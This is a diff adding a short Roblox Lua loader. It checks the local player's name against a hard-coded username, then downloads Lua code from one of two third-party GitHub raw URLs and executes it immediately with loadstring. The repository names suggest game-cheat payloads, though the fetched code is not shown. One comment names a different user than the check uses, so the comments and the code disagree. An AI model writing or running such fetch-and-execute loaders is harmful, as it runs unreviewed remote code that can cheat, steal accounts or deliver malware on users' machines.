@@ -1,0 +1,15 @@
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
+if localPlayer then
+    -- Converts the player's name to all lowercase before checking
+    if string.lower(localPlayer.Name) == "williampmaco2" then
+        -- Execute this if the user is dylancuriae25 (case-insensitive)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/annan1310/gag2/refs/heads/main/starspawner"))()
+    else
+        -- Execute this if the user is NOT williampmaco2
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/SCRIPTER65/GAG-2/refs/heads/main/Lua"))()
+    end
+else
+    warn("LocalPlayer not found.")
+end
